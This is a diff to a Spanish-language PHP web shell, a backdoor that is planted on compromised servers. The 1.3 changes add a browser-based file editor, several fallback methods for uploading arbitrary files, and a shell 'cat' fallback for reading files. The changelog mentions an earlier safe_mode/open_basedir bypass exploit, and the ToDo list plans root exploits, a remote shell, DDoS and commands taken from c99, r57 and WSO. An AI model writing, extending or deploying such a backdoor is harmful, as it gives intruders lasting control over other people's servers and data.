@@ -38,18 +38,16 @@
   THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  
   Changelog:
-  1.2
-    [+] Explota un bug con ini_restore para saltearse safe_mode y open_basedir PHP <= 5.1.6 / 4.4.4
-    [!] Cambió el orden de los error_reporting para que sea mas facil debuggear
-    [!] Intenta modificar memory_limit
-    [!] Al listar archivos los va mostrando de a uno, para no llegar al limite de memoria (funciona bien con los 8mb default)
-    [!] Las lineas del textarea de w=shell se acomodan a las lineas de la salida del comando
-    [!] Arreglado un bug en archivosdeusuarios(), que hacia que devuelva solo una ubicacion
-    [+] Agregado "<whereis ruby" y corregido .htacces por .htaccess en w=info
+  1.3
+    [!] Si phpinfo() está desactivado, da un error en w=phpinfo
+    [+] Muestra los modulos cargados en w=info
+    [!] Solucionado un error muy chico en w=editar, que mostraba todo seguido sin un salto de linea
+    [!] Si en w=editar se envia el formulario con enter, se vuelve a mostrar el mismo texto pero no se guarda nada. Antes era como apretar guardar
+    [+] Al subir archivos, ahora intenta usar move_uploaded_file(), leerarchivo() y escribirarchivo()
+    [+] leerarchivo() ahora llama a cat "$archivo"
     
    ToDo:
    [!] Eliminar los mensajes de: "No se puede leer /var/log/messages porque supera los 50000 bytes", o ponerlos como link
-   [+] Modificar leerarchivo() para que use shell() con cat
    [+] Agregar rootexploits
    [+] Agregar exploits de php
    [+] Agregar una shell remota tipo datacha0s en varios lenguajes (php, c y perl seguro)
@@ -67,11 +65,10 @@
    [+] DDoS ?
    [+] Poner todas las imágenes en un solo archivo y mostrarlas con css para ahorrar peticiones
    [+] Usar ajax
-   [+] Mostrar los módulos instalados
    [+] Agregar comandos de la WSO, r57 y las variaciones de c99
-   [!] si en w=editar haces click en el text y apretas enter, es como apretar guardar
-   [!] ?w=subir tiene que usar escribirarchivo()
- 
+   [+] Poner el css como las imagenes, en una peticion aparte y poner una version oscura
+   [+] Agregar datos importantes en el index (y todas partes) como las shells clasicas, pero oculto hasta que se lleve el mouse para arriba
+   [+] Agregar un reverse dns como el de US dentro de la shell
 */
 
 //Usuario (Dejalo vacio para que no pida clave):
@@ -853,49 +850,76 @@ psybnc.conf
         </div>';
         
         $ruta=$_REQUEST["ruta"].$_REQUEST["ruta2"];
-        //mostramos el form para abrir archivos
+        //mostramos el form 
         echo '
-            <form action="'.$rfiurl.'w=editar" method="POST" default="">
+            <form action="'.$rfiurl.'w=editar" method="POST" name="editar" default="">
                 <input style="width:80%;float:left;" type="text" name="ruta" value="'.htmlentities($ruta,ENT_QUOTES,'UTF-8').'">
-                <input type="submit" value="Guardar" name="accion" style="width:7%;float:right;">
-                <input type="submit" value="Abrir" name="accion" style="width:7%;float:right;">
+                <input type="hidden" name="accion" value="enter">
+                <input type="button" value="Guardar" style="width:7%;float:right;" onclick="editar.accion.value=/Guardar/.source;editar.submit()">
+                <input type="button" value="Abrir" style="width:7%;float:right;" onclick="editar.accion.value=/Abrir/.source;editar.submit()">
+                <br />
             ';
         
-        //escribimos el archivo
-        if ($_POST["accion"]=="Guardar"){
-            if(($ruta!=="") and isset($ruta)){
-                $contenido = $_POST["contenido"];
-                $resultado = escribirarchivo($ruta,$contenido);
-                if ($resultado===FALSE){
-                    echo '<br><div class="n">Sin permisos de escritura o todas las funciones desactivadas</div>';
+        switch($_POST["accion"]) {
+            
+            //escribimos el archivo
+            case "Guardar":
+                if(($ruta!=="") and isset($ruta)){
+                    $contenido = $_POST["contenido"];
+                    $resultado = escribirarchivo($ruta,$contenido);
+                    if ($resultado===FALSE){
+                        echo '<br><div class="n">Sin permisos de escritura o todas las funciones desactivadas</div>';
+                    }
                 }
-            }
-        }
-        
-        //leemos el archivo
-        if (($archivo=leerarchivo($ruta))!==FALSE){
-            $perm = permisos($ruta);
-            //ponemos los colores de los permisos
-            if (is_writable($ruta)){
-                $colorpermisos = "#8ABD22";
-            }else{
-                $colorpermisos = "#CD2626";
-            }
-            //mostramos el dueño del archivo
-            $data = posix_getpwuid(fileowner($ruta));
-            $usuario = $data["name"];
-            $data = posix_getgrgid(filegroup($ruta));
-            $usuario.= ':'.$data["name"];
             
-            echo '<br><div style="display:inline;color:'.$colorpermisos.'">('.$perm.')</div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Due&ntilde;o: '.$usuario.'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Modificado: '.date("d/m/Y H:i",filectime($ruta));
-            
-        }else{
-            if(($ruta!=="") and isset($ruta) and !isset($_REQUEST["ruta2"])){
-                echo '<br><div class="n">Archivo inexistente, sin permisos de lectura o todas las funciones desactivadas</div>';
-            }
+            //no hay break a proposito, porque despues de escribir el archivo lo quiero leer para comprobar que esté bien guardado
+            //leemos el archivo
+            case "Abrir":
+            default:
+                if (($archivo=leerarchivo($ruta))!==FALSE){
+                    $perm = permisos($ruta);
+                    //ponemos los colores de los permisos
+                    if (is_writable($ruta)){
+                        $colorpermisos = "#8ABD22";
+                    }else{
+                        $colorpermisos = "#CD2626";
+                    }
+                    //mostramos el dueño del archivo
+                    $data = posix_getpwuid(fileowner($ruta));
+                    $usuario = $data["name"];
+                    $data = posix_getgrgid(filegroup($ruta));
+                    $usuario.= ':'.$data["name"];
+                    
+                    echo '<br><div style="display:inline;color:'.$colorpermisos.'">('.$perm.')</div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Due&ntilde;o: '.$usuario.'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Modificado: '.date("d/m/Y H:i",filectime($ruta));
+                    
+                }else{
+                    if(($ruta!=="") and isset($ruta) and !isset($_REQUEST["ruta2"])){
+                        echo '<br><div class="n">Archivo inexistente, sin permisos de lectura o todas las funciones desactivadas</div>';
+                    }
+                }
+                
+                break;
+                
+            case "enter":
+                $archivo = $_POST["contenido"];
+                $perm = permisos($ruta);
+                //ponemos los colores de los permisos
+                if (is_writable($ruta)){
+                    $colorpermisos = "#8ABD22";
+                }else{
+                    $colorpermisos = "#CD2626";
+                }
+                //mostramos el dueño del archivo
+                $data = posix_getpwuid(fileowner($ruta));
+                $usuario = $data["name"];
+                $data = posix_getgrgid(filegroup($ruta));
+                $usuario.= ':'.$data["name"];
+                
+                echo '<br><div style="display:inline;color:'.$colorpermisos.'">('.$perm.')</div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Due&ntilde;o: '.$usuario.'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Modificado: '.date("d/m/Y H:i",filectime($ruta));
+                break;
         }
-        
-        //mostramos el formulario
+     
+        //mostramos el textarea
         echo '
         <br>
             <textarea style="width:100%; height:300px;" name="contenido">'.htmlentities($archivo,ENT_QUOTES,'UTF-8').'</textarea><br><br>
@@ -954,8 +978,13 @@ psybnc.conf
         $ruta = $_POST["ruta"];
         $subio = false;
         if (isset($ruta) and ($ruta!="")){
+            //esto podria ser un solo if, pero asi es mas facil de debuggear
             if (is_uploaded_file($HTTP_POST_FILES['ruta2']['tmp_name'])) {
-                if(copy($HTTP_POST_FILES['ruta2']['tmp_name'], $ruta.$HTTP_POST_FILES['ruta2']['name'])){
+                if(move_uploaded_file($HTTP_POST_FILES['ruta2']['tmp_name'], $ruta.$HTTP_POST_FILES['ruta2']['name'])){
+                    $subio = true;
+                }elseif(copy($HTTP_POST_FILES['ruta2']['tmp_name'], $ruta.$HTTP_POST_FILES['ruta2']['name'])){
+                    $subio = true;
+                }elseif((($archivo=leerarchivo($HTTP_POST_FILES['ruta2']['tmp_name']))!==false) and (escribirarchivo($ruta.$HTTP_POST_FILES['ruta2']['name'],$archivo)!==false)){
                     $subio = true;
                 }
             }
@@ -964,6 +993,7 @@ psybnc.conf
                 echo '<div class="s center">&quot;'.htmlentities($ruta.$HTTP_POST_FILES['ruta2']['name'],ENT_QUOTES,'UTF-8').'&quot; fue creado</div><br><br>';
             }else{
                 echo '<div class="n center">Error creando &quot;'.htmlentities($ruta.$HTTP_POST_FILES['ruta2']['name'],ENT_QUOTES,'UTF-8').'&quot;</div><br><br>';
+                    echo "no";
             }
         }else{
             echo '<script>document.location="'.$rfiurl.'w=archivos"</script>';
@@ -1335,7 +1365,7 @@ function leerarchivo($ruta){
     }else{
         $permisosviejos = FALSE;
     }
-    
+        
     if(($salida = leerarchivofopen($ruta))!==false){
         
     }elseif(($salida = leerarchivoreadfile($ruta))!==false){
@@ -1343,7 +1373,9 @@ function leerarchivo($ruta){
     }elseif(($salida = implode('', file($ruta)))!==false){
         
     }elseif(function_exists(file_get_contents) and (($salida = file_get_contents($ruta))!==false)){
-
+        
+    }elseif(($salida = shell('cat "'.addslashes($ruta).'"',false))!==false){
+        
     }else{ $salida = FALSE; }
     
     if ($permisosviejos !== FALSE){
